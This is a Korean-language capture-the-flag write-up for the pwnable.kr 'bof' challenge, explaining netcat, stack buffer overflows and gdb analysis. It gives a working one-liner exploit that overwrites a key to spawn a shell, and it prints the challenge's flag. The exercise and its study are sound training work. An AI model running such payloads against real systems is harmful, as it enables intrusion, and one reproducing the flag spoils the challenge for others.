## 3. bof

`nc pwnable.kr 9000`

### nc(netcat)

[출처1](http://htst.tistory.com/61) [출처2](https://www.itlkorea.kr/data/netcat-pocket-guide1.0.pdf)

넷캣(NetCat, nc)은 TCP나 UDP 프로토콜을 사용하는 네트워크 연결에서 데이터를 읽고 쓰는 간단한 유틸리티 프로그램이다. 일반적으로는 UNIX의 cat과 비슷한 사용법을 가지고 있지만 cat이 파일에 쓰거나 읽듯이 nc는network connection에 읽거나 쓴다. 이것은 스크립트와 병용하여 network에 대한 debugging, testing tool로써 매우 편리하지만 반면 해킹에도 이용범위가 넓다.

nc 명령어는 아래와 같은 형태로 이루어져있다.

```bash
nc [목표ip주소] [포트]
```

`목표ip주소`는 IP 주소 또는 도메인명으로 클라이언트 모드에서는 필수이며 서버 모드에서는 선택 사항이다.

### bof

[출처](http://cosyp.tistory.com/206)

버퍼(buffer)는 데이터가 저장되는 메모리 공간으로, 데이터가 지정된 버퍼 크기보다 커서 해당 메모리 공간을 벗어나는 것을 버퍼 오버플로우(buffer overflow, BOF)라고 한다. 프로그램에 버퍼 오버플로우 취약점이 있는 경우 이를 이용하여 시스템 권한을 상승시키거나 악성 행위를 할 수 있다.

### 디버깅하기

이 문제는 nc를 이용하여 답을 서버에 전달해야 하기 때문에 `ssh`를 이용하는 다른 문제 서버에서 디버깅한다. `collision` 문제의 서버에 접속한 후 `/tmp`에 임의의 폴더 를 만든다.

```bash
col@ubuntu:~$ mkdir /tmp/ming
```

 `scp`  명령어를 이용해 `bof`  파일을 복사해온다.

```bash
$ scp -P 2222 ./bof col@pwnable.kr:/tmp/ming
col@pwnable.kr's password: 
bof                                           100% 7348    69.8KB/s   00:00   
```

```bash
col@ubuntu:/tmp/ming$ ls
bof
```

#### bof.c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

코드에서는 `key`  값이 `0xcafebabe`이면 쉘을 딸 수 있다. `gets`는 입력값의 범위를 제한하지 않으므로 `gets(overflowme)`를 이용해 `key`값을 변경할 수 있을 것이다.

#### gdb 이용하기

gdb를 이용하여 파일을 실행하기 위해 `chmod 777 bof`로 실행 권한을 준다. gdb를 이용하여 `disas func`명령어로 `func` 함수를 살펴보면 `overflowme`와 `key`의 메모리 주소를 알 수 있다.

```assembly
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

#### payload

`ebp-0x2C`에 사용자 입력값을 저장한후 `ebp+0x8`에 저장된 값을 `0xcafebabe`와 비교한다. 따라서 두 주소의 차이만큼 데이터를 덮어주면 `key`값 즉, `[ebp+0x8]`을 원하는 값으로 변경할 수 있다.

```bash
0x2C + 0x08 = 52
```

따라서 payload는 다음과 같이 구성된다.

|  주소값 차이  |   원하는 값    |
| :------: | :--------: |
| "A" * 52 | 0xcafebabe |

#### exploit

파이썬을 이용하여 서버에 접속할 때 payload를 전달한다.

```bash
$ (python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
```

위의 명령어를 입력하고 `ls`를 쳐보면 다음과 같이 존재하는 파일 목록을 볼 수 있다.

```bash
bof
bof.c
flag
log
log2
super.pl
```

`cat flag`를 쳐보면 flag 값이 나타난다.

```bash
cat flag
daddy, I just pwned a buFFer :)
```

### chmod

[출처](https://ko.wikipedia.org/wiki/Chmod)

chmod(**ch**ange **mod**e)는 유닉스에서 쓰이는 쉘 명령어로 파일이나 디렉토리들의 파일 시스템 모드를 바꾼다.

```bash
$ chmod [options] mode[,mode] file1 [file2 ...]
```

|  -   |   rwx   |   rwx    |   rwx    |
| :--: | :-----: | :------: | :------: |
| 파일권한 | user 권한 | group 권한 | other 권한 |

